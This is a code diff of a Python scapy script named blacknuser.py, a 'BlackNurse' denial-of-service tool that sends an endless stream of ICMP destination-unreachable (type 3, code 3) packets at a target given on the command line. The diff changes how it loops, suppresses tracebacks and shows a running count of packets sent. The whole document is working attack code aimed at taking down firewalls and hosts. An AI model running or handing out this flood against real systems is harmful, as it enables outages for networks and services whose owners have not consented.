@@ -2,12 +2,13 @@
 #author Aiden
 
 from scapy.all import *
-import sys , re , socket , threading
+import sys , re , socket 
 
 if len(sys.argv) != 2:
 	print "Usage: blacknuser.py <target>"
 	sys.exit(1)
 
+sys.tracebacklimit=0	
 victim = sys.argv[1]
 #iface = 'eth0'
 #socket = conf.L2socket(iface=iface)
@@ -27,10 +28,6 @@ class blacknurse(threading.Thread):
 				host = m.group(2)
 				target = socket.gethostbyname(host)
 
-		def __int__(self):
-			threading.Thread.__init__(self)
-
-		
 		def run(self):
 			self.check()
 			packet = IP(dst=target)/ICMP(type=3,code=3)
@@ -41,8 +38,9 @@ class blacknurse(threading.Thread):
 	except:
 		print 'Victim not available!'
 		sys.exit(1)
-total = 0		
+total = 0	
+black = blacknurse()
 while True:
-	blacknurse().start()
+	black.run()
 	total += 1
 	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
